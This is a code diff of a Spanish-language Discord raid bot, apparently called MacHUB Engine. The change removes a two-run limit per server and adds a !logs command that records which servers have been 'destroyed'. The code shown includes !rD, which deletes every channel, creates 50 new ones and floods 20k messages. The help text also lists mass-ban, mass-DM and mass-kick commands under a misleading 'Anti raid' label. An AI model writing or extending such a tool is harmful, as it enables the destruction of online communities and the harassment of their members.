@@ -20,8 +20,8 @@ TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"
 GIF_URL = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737a9ca0084c939821aaba7.webp?size=2048&animated=true"
 
 # ================= VARIABLES GLOBALES OPTIMIZADAS =================
-ejecuciones_por_servidor = {}  
-MAX_EJECUCIONES = 2
+# Lista global para almacenar el historial de servidores destruidos
+historial_logs = []  
 tiempo_inicio = datetime.now()
 
 # Configuración explícita de los Intents necesarios
@@ -39,38 +39,37 @@ async def on_ready():
     logging.info(f"⚡ MacHUB Engine Conectado: {bot.user.name} (ID: {bot.user.id})")
 
 
-# ================= FUNCIÓN AUXILIAR PARA EL EMBED DE !eje =================
-def generar_embed_eje(guild_id):
-    global ejecuciones_por_servidor, MAX_EJECUCIONES
-    
-    # Si el servidor no registra actividad, empieza en 0
-    actuales = ejecuciones_por_servidor.get(guild_id, 0)
-    
-    if actuales == 0:
-        color = discord.Color.green()
-    elif actuales == 1:
-        color = discord.Color.orange()
-    else:
-        color = discord.Color.red()
-    
-    embed = discord.Embed(
-        title="📊 CONTROL DE EJECUCIONES",
-        description=f"**Ejecuciones del bot en este servidor:** `{actuales}/{MAX_EJECUCIONES}`",
-        color=color
-    )
-    embed.set_footer(text="MacHUB Engine • Monitoreo por servidor")
-    embed.timestamp = datetime.now()
-    return embed
-
-
-# ================= COMANDO !eje (INDIVIDUAL POR SERVIDOR) =================
+# ================= NUEVO: COMANDO !logs =================
 @bot.command()
-async def eje(ctx):
-    if not ctx.guild: return  
+async def logs(ctx):
+    global historial_logs
     
-    embed = generar_embed_eje(ctx.guild.id)
+    # Si la lista de logs está vacía, avisamos con un embed limpio
+    if not historial_logs:
+        embed_vacio = discord.Embed(
+            title="📋 HISTORIAL DE LOGS",
+            description="*No se han registrado destrucciones todavía.*",
+            color=discord.Color.blue()
+        )
+        embed_vacio.set_footer(text="MacHUB Engine • Sistema de Monitoreo")
+        await ctx.send(embed=embed_vacio)
+        return
+
+    # Creamos el Embed principal con todos los servidores destruidos
+    texto_logs = ""
+    for log in historial_logs:
+        texto_logs += f"💥 El servidor **{log['servidor']}** ha sido destruido.\n*Hora: {log['hora']}*\n\n"
+
+    embed_logs = discord.Embed(
+        title="📋 HISTORIAL DE LOGS",
+        description=texto_logs,
+        color=discord.Color.red()
+    )
+    embed_logs.set_footer(text="MacHUB Engine • Reporte en vivo")
+    embed_logs.timestamp = datetime.now()
+
     try:
-        await ctx.send(embed=embed)
+        await ctx.send(embed=embed_logs)
     except:
         pass
 
@@ -109,24 +108,19 @@ async def banpro(ctx):
 # ================= 2. COMANDO RAIDEAR Y SPAM (rD) =================
 @bot.command()
 async def rD(ctx):
-    global ejecuciones_por_servidor
+    global historial_logs
     if not ctx.guild: return
     
     if not ctx.author.guild_permissions.manage_channels: return
     if not ctx.guild.me.guild_permissions.manage_channels: return
 
-    # Obtener el número actual antes de la verificación
-    actuales = ejecuciones_por_servidor.get(ctx.guild.id, 0)
-
-    # 1. Control estricto de límite
-    if actuales >= MAX_EJECUCIONES:
-        try: await ctx.send(f"❌ Límite alcanzado en este servidor ({actuales}/{MAX_EJECUCIONES}). No se pueden realizar más ejecuciones.")
-        except: pass
-        return
-
-    # 🔥 NUEVO: Sumar de inmediato en memoria global antes de procesar el raideo masivo
-    ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
-    logging.info(f"📈 Contador actualizado para Guild ID {ctx.guild.id}: {actuales + 1}/{MAX_EJECUCIONES}")
+    # 🔥 REGISTRO INMEDIATO EN LOS LOGS CON EL EMOJI Y NOMBRE
+    hora_actual = datetime.now().strftime("%H:%M:%S")
+    historial_logs.append({
+        "servidor": ctx.guild.name,
+        "hora": hora_actual
+    })
+    logging.info(f"💥 Log registrado: El servidor {ctx.guild.name} ha sido destruido.")
 
     channels_to_delete = list(ctx.guild.channels)
     for channel in channels_to_delete:
@@ -361,7 +355,7 @@ async def ayuda(ctx):
         "```\n"
         "=== Mc R Anti raid - cmds ===\n"
         "!uptime       -> Muestra el tiempo activo del bot y la latencia.\n"
-        "!eje          -> Muestra el estado de ejecuciones del bot en vivo.\n"
+        "!logs         -> Muestra el historial de servidores destruidos.\n"
         "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
         "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
         "!rD           -> elimina todo, crear 50 canales e inundar con 20k mensajes.\n"
